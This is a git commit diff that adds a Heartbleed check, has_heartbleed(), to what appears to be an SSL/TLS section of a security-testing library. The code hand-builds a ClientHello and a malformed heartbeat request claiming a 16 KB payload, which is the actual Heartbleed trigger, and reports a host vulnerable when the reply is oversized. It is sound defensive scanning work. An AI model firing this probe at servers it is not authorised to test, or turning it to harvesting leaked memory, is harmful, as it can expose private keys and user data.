102421d6d92c4126f1bd153b1a57fa497edfb0fb
Andres Roldan <aroldan@fluid.la>
2018-02-23 16:36:35 -0500

    Implemented ssl.has_heartbleed()
    Former-commit-id: 2e2e99f8182bd7ddcb71b12028894d4e7782d89d

--- src/service/ssl.py
+++ src/service/ssl.py
@@ -7,6 +7,7 @@ from contextlib import contextmanager
 import datetime
 import socket
 import ssl
+import struct
 
 # 3rd party imports
 import certifi
@@ -45,6 +46,102 @@ def __my_add_padding(self, data):
     padding_bytes.append(padding_length)
     data += padding_bytes
     return data
+
+
+def __hex2bin(arr):
+    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')
+
+
+def __rcv_tls_record(sock):
+    try:
+        tls_header = sock.recv(5)
+        if not tls_header:
+            return None, None, None
+        typ, ver, length = struct.unpack('>BHH', tls_header)
+        message = ''
+        while len(message) != length:
+            message += sock.recv(length-len(message))
+        if not message:
+            return None, None, None
+        return typ, ver, message
+    except socket.error:
+        return None, None, None
+
+
+def __build_client_hello(tls_ver):
+    ssl_version_mapping = {
+        'SSLv3':   0x00,
+        'TLSv1.0': 0x01,
+        'TLSv1.1': 0x02,
+        'TLSv1.2': 0x03
+    }
+    client_hello = [
+        # TLS header ( 5 bytes)
+        0x16,               # Content type (0x16 for handshake)
+        0x03, ssl_version_mapping[tls_ver],         # TLS Version
+        0x00, 0xdc,         # Length
+        # Handshake header
+        0x01,               # Type (0x01 for ClientHello)
+        0x00, 0x00, 0xd8,   # Length
+        0x03, ssl_version_mapping[tls_ver],         # TLS Version
+        # Random (32 byte)
+        0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
+        0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
+        0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
+        0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
+        0x00,               # Session ID length
+        0x00, 0x66,         # Cipher suites length
+        # Cipher suites (51 suites)
+        0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
+        0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
+        0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
+        0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
+        0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
+        0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
+        0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
+        0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
+        0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
+        0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
+        0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
+        0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
+        0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
+        0x01,               # Compression methods length
+        0x00,               # Compression method (0x00 for NULL)
+        0x00, 0x49,         # Extensions length
+        # Extension: ec_point_formats
+        0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
+        # Extension: elliptic_curves
+        0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
+        0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
+        0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
+        0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
+        0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
+        0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
+        0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
+        # Extension: SessionTicket TLS
+        0x00, 0x23, 0x00, 0x00,
+        # Extension: Heartbeat
+        0x00, 0x0f, 0x00, 0x01, 0x01]
+    return client_hello
+
+
+def __build_heartbeat(tls_ver):
+    ssl_version_mapping = {
+        'SSLv3':   0x00,
+        'TLSv1.0': 0x01,
+        'TLSv1.1': 0x02,
+        'TLSv1.2': 0x03
+    }
+
+    heartbeat = [
+        0x18,       # Content Type (Heartbeat)
+        0x03, ssl_version_mapping[tls_ver],  # TLS version
+        0x00, 0x03,  # Length
+        # Payload
+        0x01,       # Type (Request)
+        0x40, 0x00  # Payload length
+    ]
+    return heartbeat
 
 
 @contextmanager
@@ -599,6 +696,40 @@ Details={}:{}'.format(site, port))
         show_close('Site not vulnerable to BEAST attack, \
 Details={}:{}'.format(site, port))
         result = False
+    except socket.error:
+        show_unknown('Port is closed, Details={}:{}'.
+                     format(site, port))
+        result = False
+    return result
+
+
+@track
+def has_heartbleed(site, port=PORT):
+    """Check whether site allows HEARTBLEED attack."""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(5)
+        sock.connect((site, port))
+        versions = ['TLSv1.2', 'TLSv1.1', 'TLSv1.0', 'SSLv3']
+        for vers in versions:
+            sock.send(__hex2bin(__build_client_hello(vers)))
+            typ, _, message = __rcv_tls_record(sock)
+            if not typ:
+                continue
+            if typ == 22 and ord(message[0]) == 0x0E:
+                # Received Server Hello
+                sock.send(__hex2bin(__build_heartbeat(vers)))
+                typ, _, pay = __rcv_tls_record(sock)
+                if typ == 24:
+                    # Received hearbeat response
+                    if len(pay) > 3:
+                        # Length is higher than sent
+                        show_open('Site vulnerable to Heartbleed \
+attack, Details={}:{}'.format(site, port))
+                        return True
+        show_close('Site doesn\'t support SSL/TLS \
+heartbeats, Details={}:{}'.format(site, port))
+        return False
     except socket.error:
         show_unknown('Port is closed, Details={}:{}'.
                      format(site, port))
